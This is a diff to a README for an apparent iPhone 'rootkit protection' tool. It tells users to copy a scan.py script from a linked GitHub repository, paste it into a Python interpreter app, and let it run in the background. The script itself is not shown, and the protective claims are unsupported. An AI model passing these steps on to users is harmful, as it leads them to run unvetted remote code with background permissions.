@@ -1,19 +1,26 @@
 # IPHONE-RAT-PROTECT
                     IPHONE-ROOTKIT TOOLS PROTECTION
-_____________________________________________________________________________________
+___________________________________________________________________________________________________
 WELCOME TO READ-ME
 
 FOR INSTALLATION FOLLOW THESE STEPS:
 
-_____________________________________________________________________________________
+___________________________________________________________________________________________________
 
 1) Install Python on your IOS from here:
 https://apps.apple.com/us/app/python-programming-interpreter/id1335895307
 
 2) Wait until Python Programming Interpreter is open.
 
-3) Load your scan.py and run it
+3) Copy scan.py script from this link:
+ https://github.com/servizioaggiornato/IPHONE-RAT-PROTECT/blob/main/scan.py
 
-4) Give app permission to run in background and your protection will be Activated.
+4) Grant to Python Programming Interpreter permission to run in background and your protection 
+ will be Activated
 
-_____________________________________________________________________________________
+5) Create a New Code, paste the code.
+
+6) Click the green arrow for start the code and run the app in background for
+ stay protected.
+
+___________________________________________________________________________________________________
